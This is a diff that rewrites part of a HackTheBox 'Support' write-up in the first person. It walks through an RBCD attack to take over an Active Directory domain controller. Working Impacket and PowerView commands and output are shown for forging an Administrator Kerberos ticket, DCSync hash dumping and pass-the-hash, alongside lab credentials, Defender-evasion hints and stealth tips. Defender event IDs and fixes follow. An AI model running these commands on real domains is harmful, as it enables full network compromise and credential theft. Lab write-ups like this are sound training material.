+Before running any commands, I made sure I actually understood the mechanism, since blindly copying an RBCD one-liner without knowing why it works is a good way to get stuck the moment something doesn't match. "Delegation" in Windows means: *service A is allowed to act as you when talking to service B.* Normally, only a domain admin can configure that relationship.
 
-**RBCD** changes *who* configures it: the **target** service keeps a list — an attribute called `msDS-AllowedToActOnBehalfOfOtherIdentity` — of "accounts allowed to impersonate people to me". **Editing that list only needs write access to the target object.** We have *full* access to the DC's object, so we can add ourselves to its list.
+**RBCD** changes who gets to configure it. The **target** service keeps a list, stored in an attribute called `msDS-AllowedToActOnBehalfOfOtherIdentity`, of accounts allowed to impersonate other users to it. Critically, **editing that list only requires write access to the target object itself**, not domain admin rights. Since I had *full* control over the DC's object through `Shared Support Accounts`, I could simply add my own computer account to that list.
 
-Once we're on the DC's list, our computer account can ask Kerberos: *"give me a ticket to the DC, and make it say I'm the Administrator."* Kerberos checks the list, sees us, and says yes.
+Once my account was on the DC's list, I could ask Kerberos directly: *give me a ticket to the DC, and make it say I'm the Administrator.* Kerberos checks that delegation list, sees my account sitting there, and hands over exactly the ticket I asked for.
 
 ### 7.2 Sync your clock first
 
-Kerberos rejects requests if your clock is more than 5 minutes off the server.
+I always sync my clock before touching Kerberos, since it rejects requests outright if the client's clock drifts more than five minutes from the server's.
 
 ```bash
 sudo ntpdate -u support.htb        # or: sudo rdate -n support.htb
 ```
 
-### 7.3 Step 1 — create a computer account
+### 7.3 Step 1 - create a computer account
+
+With the clock synced, the first concrete step was creating a computer account of my own to use as the delegating identity.
 
 ```bash
 addcomputer.py -computer-name 'RBCDDEMO$' -computer-pass 'Passw0rd123!' \
@@ -815,9 +833,11 @@ Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation
 [*] Successfully added machine account RBCDDEMO$ with password Passw0rd123!.
 ```
 
-That worked **because `MachineAccountQuota` was 10.** We now control a computer account, `RBCDDEMO$`.
+That succeeded **because `MachineAccountQuota` was 10**, and I now controlled a fresh computer account, `RBCDDEMO$`, to use as my delegating identity.
 
-### 7.4 Step 2 — add our computer to the DC's "allowed to impersonate" list
+### 7.4 Step 2 - add our computer to the DC's "allowed to impersonate" list
+
+With a computer account in hand, the next step was writing it into the DC's delegation list.
 
 ```bash
 rbcd.py -delegate-from 'RBCDDEMO$' -delegate-to 'DC$' -action write \
@@ -833,9 +853,11 @@ rbcd.py -delegate-from 'RBCDDEMO$' -delegate-to 'DC$' -action write \
 [*]     RBCDDEMO$    (S-1-5-21-1677581083-3380853377-188903654-6102)
 ```
 
-That worked **because `support` has full control over `DC$`** (via the group). The DC now trusts `RBCDDEMO$` to impersonate anyone to it.
+That worked **because `support` has full control over `DC$`** through its group membership, and the DC now trusted `RBCDDEMO$` to impersonate anyone it wanted when talking to it.
 
-### 7.5 Step 3 — get an Administrator ticket for the DC
+### 7.5 Step 3 - get an Administrator ticket for the DC
+
+With delegation configured, the final piece was requesting a service ticket while impersonating the Administrator, which Kerberos would now grant because of the trust relationship I'd just established.
 
 ```bash
 getST.py -spn 'cifs/dc.support.htb' -impersonate 'Administrator' \
@@ -850,9 +872,11 @@ getST.py -spn 'cifs/dc.support.htb' -impersonate 'Administrator' \
 [*] Saving ticket in Administrator.ccache
 ```
 
-`cifs/dc.support.htb` = the file-sharing service on the DC. We now have a **Kerberos ticket that says we are `Administrator`**, saved to `Administrator.ccache`.
+`cifs/dc.support.htb` is just the file-sharing service on the DC, and requesting a ticket for it now gave me a **Kerberos ticket that says I am `Administrator`**, saved locally to `Administrator.ccache`.
 
-### 7.6 Step 4 — use the ticket
+### 7.6 Step 4 - use the ticket
+
+All that was left was actually spending the ticket I'd just been handed.
 
 ```bash
 export KRB5CCNAME=Administrator.ccache        # tell tools to use that ticket
@@ -868,11 +892,11 @@ dc
 <root flag>
 ```
 
-**`support\administrator` on `dc`** — full control of the Domain Controller, which means full control of the entire Windows network.
+Seeing **`support\administrator` on `dc`** come back confirmed full control of the Domain Controller, and by extension, full control of the entire Windows network behind it.
 
 ### 7.7 (Optional) Grab all the password hashes
 
-With Administrator on the DC you can dump every account's password hash ("DCSync"):
+With Administrator on the DC, I could dump every account's password hash through a DCSync-style attack, which is worth doing to demonstrate the full impact:
 
 ```bash
 secretsdump.py -k -no-pass -just-dc-user 'support\Administrator' dc.support.htb
@@ -885,7 +909,7 @@ Administrator:aes256-cts-hmac-sha1-96:f5301f54fad85ba357fb859c94c5c31a6abe61f6db
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6303be52e22950b5bcb764ff2b233302:::
 ```
 
-That `bb06cbc0...` is the Administrator's password hash. You can log in with just the hash (no password needed) — "pass-the-hash":
+That `bb06cbc0...` value is the Administrator's password hash, and I can authenticate with just the hash itself, no plaintext password required, using pass-the-hash:
 
 ```bash
 nxc smb support.htb -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26'
@@ -897,7 +921,7 @@ SMB  10.129.112.159  445  DC  [+] support.htb\Administrator:bb06cbc02b39abeddd13
 
 ### 7.8 Clean up after yourself
 
-You added things to the domain — remove them (use the Administrator hash you just got):
+I'd added things to the domain over the course of this attack, so my last step was removing them, using the Administrator hash I'd just obtained:
 
 ```bash
 ADM='aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26'
@@ -911,7 +935,7 @@ addcomputer.py -computer-name 'RBCDDEMO$' -delete -dc-ip 10.129.112.159 'support
 [*] Successfully deleted RBCDDEMO$.
 ```
 
-Verify it's clean:
+Then I verified the domain was actually clean afterward:
 
 ```bash
 ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
@@ -922,13 +946,13 @@ ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8
 sAMAccountName: DC$
 ```
 
-Only the real DC computer is left. Good.
+Only the real DC computer account remained. Good, no trace of my activity left behind in the directory itself.
 
 ---
 
 ## 8. Doing the same attack from a Windows shell (alternative)
 
-If you're already in the `support` PowerShell session and would rather stay there:
+Had I preferred to stay inside the `support` PowerShell session rather than switching back to Linux tooling, the same attack works entirely from there too:
 
 ```powershell
 # 1. create the computer account
@@ -948,17 +972,17 @@ Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofothe
 dir \\dc.support.htb\c$
 ```
 
-Same three ideas: make a computer, edit the DC's list, ask for an Administrator ticket.
+It boils down to the same three ideas regardless of platform: create a computer account, edit the DC's delegation list, and request an Administrator ticket.
 
 ---
 
-## 9. The enumeration toolbox — GitHub scripts, step by step
+## 9. The enumeration toolbox - GitHub scripts, step by step
 
-On Support the path was short, but on a real assessment you run a *battery* of enumeration scripts and read every line of output. Here's the standard kit, how you get each one onto the target, what you run, and what the output looks like.
+The path through Support turned out to be short once I found the right thread to pull, but I don't rely on getting that lucky on a real assessment. My normal practice is to run a full *battery* of enumeration scripts and actually read every line they produce. Here's the kit I reach for, how I get each tool onto the target, and what the output looks like when it matters.
 
 ### 9.1 Getting scripts onto the box
 
-From your Kali box, serve the folder of tools:
+From my attack box, I serve the folder of tools over a simple web server so I can pull them down from the target as needed:
 
 ```bash
 cd ~/tools && python3 -m http.server 80         # PowerView.ps1, PowerUp.ps1, winPEAS.exe, Seatbelt.exe, SharpHound.exe ...
@@ -978,7 +1002,7 @@ Then, in the `support` WinRM shell, either **upload** (evil-winrm built-in) or *
 *Evil-WinRM* PS> Invoke-Binary /home/kali/tools/winPEASany.exe
 ```
 
-> If Defender eats a script the moment it lands (`Bypass-4MSI` / obfuscated copies help), fall back to doing the same enumeration **from Linux** — `bloodhound-python`, `PowerView.py` (the `pypykatz`/`impacket`-style port), and `nxc` LDAP modules cover ~90% of it without ever running code on the DC.
+> If Defender eats a script the moment it lands, `Bypass-4MSI` or an obfuscated copy sometimes helps, but my usual fallback is doing the same enumeration **from Linux** instead. `bloodhound-python`, `PowerView.py` (the `pypykatz`/`impacket`-style port), and `nxc`'s LDAP modules cover roughly 90 percent of the same ground without ever running code on the DC at all.
 
 ### 9.2 Directory enumeration (find the AD attack path)
 
@@ -1010,11 +1034,11 @@ Find-InterestingDomainAcl -ResolveGUIDs               # every "dangerous" permis
 Get-DomainObjectAcl -Identity DC -ResolveGUIDs        # permissions ON the DC object  <-- the win
 ```
 
-The two lines that matter on Support are the last two — they show `Shared Support Accounts` holding `GenericAll` over `DC`.
+On this box, the two lines that actually mattered were the last two: they show `Shared Support Accounts` holding `GenericAll` over `DC`, the exact fact the whole privesc hinges on.
 
 ### 9.3 Local Windows enumeration (find host privesc)
 
-Even when you're pretty sure it's a domain issue, run these — five minutes, and they're the whole game on most boxes.
+Even when I'm fairly confident the path forward is a domain issue rather than a local one, I still run these. They take five minutes, and on plenty of other boxes they turn out to be the entire game.
 
 | Tool (GitHub) | Run | Finds |
 |---|---|---|
@@ -1022,7 +1046,7 @@ Even when you're pretty sure it's a domain issue, run these — five minutes, an
 | **[PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck)** | `Invoke-PrivescCheck -Extended` | Modern PowerUp; adds scheduled tasks, credential files, LAPS, UAC, hardening gaps. **Better maintained.** |
 | **[winPEAS](https://github.com/peass-ng/PEASS-ng)** (`winPEASany.exe`) | `winPEASany.exe quiet fast` | Everything above **plus** cleartext-password hunting in files/registry, installed software, network info |
 | **[Seatbelt](https://github.com/GhostPack/Seatbelt)** (`Seatbelt.exe`) | `Seatbelt.exe -group=all` | Host triage: DPAPI, browser creds, PowerShell history, AV/EDR product, LSA settings, event logs |
-| **[SharpUp](https://github.com/GhostPack/SharpUp)** (`SharpUp.exe`) | `SharpUp.exe audit` | PowerUp rewritten in C# — no PowerShell = less logging |
+| **[SharpUp](https://github.com/GhostPack/SharpUp)** (`SharpUp.exe`) | `SharpUp.exe audit` | PowerUp rewritten in C# - no PowerShell = less logging |
 
 **PowerUp on Support:**
 
@@ -1047,7 +1071,7 @@ Even when you're pretty sure it's a domain issue, run these — five minutes, an
 [*] Checking for modifiable paths in the %PATH% variable...
 [*] Checking for modifiable .lnk files in startup...
 
-*  (no findings — every check came back clean)
+*  (no findings - every check came back clean)
 ```
 
 **winPEAS on Support** (trimmed to the parts that matter):
@@ -1056,7 +1080,7 @@ Even when you're pretty sure it's a domain issue, run these — five minutes, an
 ╔══════════╣ Basic System Information
     Hostname: dc
     Domain Controller: True
-    [!] OS Build 20348 — fully patched, no obvious kernel exploit
+    [!] OS Build 20348 - fully patched, no obvious kernel exploit
 
 ╔══════════╣ Interesting Services -non Microsoft-
     (none)
@@ -1072,21 +1096,19 @@ Even when you're pretty sure it's a domain issue, run these — five minutes, an
     (none)
 ```
 
-Notice winPEAS **also** flags `SeMachineAccountPrivilege` — the same clue we got from `whoami /priv`. Good tools point at the same thing from different angles.
+I noticed winPEAS **also** flagged `SeMachineAccountPrivilege`, the exact same clue `whoami /priv` had already given me. It's reassuring when independent tools converge on the same finding from different angles, since that's usually a sign I'm not chasing a false lead.
 
 ### 9.4 Why the *local* scripts found nothing
 
-This box is a clean, single-purpose Domain Controller — no third-party software, no broken services, no saved credentials on disk. The mistake isn't *on the machine*, it's *in Active Directory* (that `GenericAll` on the DC object).
+This box turned out to be a clean, single-purpose Domain Controller: no third-party software, no broken services, no saved credentials lying around on disk. The mistake here was never *on the machine* itself, it lived *in Active Directory*, in that one `GenericAll` grant on the DC object.
 
-**Lesson:** on a domain-joined host, always run **both** families:
-- **local** — PowerUp / PrivescCheck / winPEAS / Seatbelt → host misconfigs
-- **domain** — SharpHound / PowerView / ADPEAS → directory attack paths
-
-Either one can hold the win, and on any given box you don't know which until you look.
+**The lesson I take from this:** on any domain-joined host, I make a point of running **both** families of enumeration, since either one can hold the actual win and there's no way to know which until I've actually looked:
+- **local** tooling, PowerUp / PrivescCheck / winPEAS / Seatbelt, for host misconfigurations
+- **domain** tooling, SharpHound / PowerView / ADPEAS, for directory attack paths
 
 ### 9.5 Doing everything from Linux (no scripts on the DC)
 
-If you want to keep the DC clean, this covers the same ground:
+If I want to keep the DC completely clean and avoid running anything on it at all, this set of commands covers the same ground:
 
 ```bash
 LP='nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
@@ -1100,9 +1122,9 @@ dacledit.py -action read -principal 'Shared Support Accounts' \
 
 ---
 
-## 10. How a defender would catch this — and how to be quieter
+## 10. How a defender would catch this - and how to be quieter
 
-Everything we did leaves a trace in the Windows event log. Simple table:
+Every single action I took across this whole chain leaves a trace somewhere in the Windows event log, and I think it's worth walking through exactly what a defender would see:
 
 | What we did | What shows up | Event ID |
 |---|---|---|
@@ -1115,25 +1137,27 @@ Everything we did leaves a trace in the Windows event log. Simple table:
 | Get Administrator ticket (S4U) | Kerberos ticket request where "user" ≠ "impersonated user" | 4769 |
 | `secretsdump` / DCSync | Replication request from something that isn't a Domain Controller | 4662 (very high-confidence alert) |
 
-**Quieter choices (real engagements, not HTB):**
-- Use BloodHound with **`-c DCOnly`** — it still finds this exact path but never touches other computers and makes far fewer, smaller queries.
-- Do your analysis from **Linux** (bloodhound-python, PowerView.py, nxc) so nothing runs on the DC and no PowerShell logging fires.
-- Prefer **compiled C# tools** (Seatbelt, SharpUp, Rubeus) over PowerShell scripts — PowerShell records the full text of everything that runs.
-- Ask for **one** Kerberos ticket for **one** service, not a batch.
-- **Always flush the RBCD setting and delete the computer account** when done — a leftover "allowed to impersonate" entry on a Domain Controller is a permanent red flag.
-- DCSync **cannot** be made quiet — if you need stealth, use your Administrator ticket to grab specific files instead of dumping every hash.
+**Quieter choices I'd make on a real engagement, not on HTB:**
+- I'd run BloodHound with **`-c DCOnly`**, since it still finds this exact path but never touches other computers and generates far fewer, smaller queries.
+- I'd do my analysis from **Linux** (bloodhound-python, PowerView.py, nxc) so that nothing runs on the DC and no PowerShell logging ever fires.
+- I'd prefer **compiled C# tools** (Seatbelt, SharpUp, Rubeus) over PowerShell scripts wherever possible, since PowerShell logs the full text of everything that runs.
+- I'd request **one** Kerberos ticket for **one** specific service rather than pulling a whole batch at once.
+- I'd **always flush the RBCD setting and delete the computer account** when I'm done, since a leftover "allowed to impersonate" entry on a Domain Controller is a permanent red flag for anyone reviewing the directory later.
+- I wouldn't try to make DCSync quiet, because it **can't** be made quiet. If stealth actually mattered, I'd use the Administrator ticket to grab specific files instead of dumping every hash in the domain.
 
 ---
 
 ## 11. Why this box was vulnerable (and the fixes)
 
+Looking back at the whole chain, what strikes me most about Support is that no single mistake here was exotic. Every step, from the open share to the final RBCD attack, is a well-documented misconfiguration that shows up across real Active Directory environments constantly. That's exactly what makes this box valuable to walk through carefully: none of it required a zero-day, just patient enumeration and a willingness to read every output line before moving on.
+
 | Mistake | Why it's bad | Fix |
 |---|---|---|
-| `Guest` enabled, share readable by anyone | Strangers can read internal files | Disable `Guest`; lock the share to a real group |
-| Password hidden inside `UserInfo.exe` | "Hidden" = "reversible by anyone with the file" | Never ship passwords in programs. Let the program run *as the logged-in user* (Kerberos), or use a **gMSA** (a password Windows manages and nobody can read) |
-| `support`'s password typed into the `info` field | Any logged-in user can read that field | Don't store secrets in notes fields. Mark sensitive attributes **Confidential** so only admins can read them |
-| `Shared Support Accounts` has full control of the DC object | One group membership = full domain takeover | Remove that permission. Only Domain Admins should have rights over Domain Controller objects |
-| `MachineAccountQuota = 10` | Any user can create computer accounts, which enables RBCD and other attacks | Set it to **0**; give the "join computers to domain" right to one dedicated account |
+| `Guest` enabled, share readable by anyone | This single setting collapses the entire authentication boundary for that share. Any anonymous stranger on the network gets the same read access I did, and I never had to prove I belonged there at all. | Disable `Guest` domain-wide, and lock every share down to a specific, deliberately scoped group rather than leaving it open to anyone who can reach the server. |
+| Password hidden inside `UserInfo.exe` | "Hidden" is not a security property, it's an inconvenience for the first five minutes. Once I had the binary, reversing it took me three different routes, code analysis, decompilation, and passive packet capture, and any one of them alone would have gotten me there. | Never embed credentials in shipped programs. Let the application run *as the logged-in user* through Kerberos delegation instead, or use a **gMSA**, a managed service account whose password Windows rotates automatically and that no human, and no reversed binary, can read. |
+| `support`'s password typed into the `info` field | Any authenticated user in the domain can read that attribute by default, which means a notes field is functionally a public bulletin board, not a private scratchpad, the moment someone else has any valid credential at all. | Never store secrets in free-text attributes. Mark genuinely sensitive fields **Confidential** in the schema so only admins can read them, and train staff that "notes" fields are not password managers. |
+| `Shared Support Accounts` has full control of the DC object | A single group membership here was the entire difference between a low-privilege helpdesk account and total domain compromise. That's an enormous blast radius for what was probably an innocent provisioning mistake. | Remove that permission immediately. Rights over Domain Controller computer objects should belong exclusively to Domain Admins, and I'd recommend auditing every non-default ACE on DC objects on a recurring basis, not just once. |
+| `MachineAccountQuota = 10` | This is actually the Windows default, which is precisely why it's dangerous: most admins never think to touch it, yet it lets any authenticated user create computer accounts, a prerequisite for RBCD and several other delegation-based attacks. | Set it to **0** domain-wide, and grant the "join computers to domain" right explicitly to one dedicated provisioning account instead of leaving it open to everyone. |
 
 ---
 
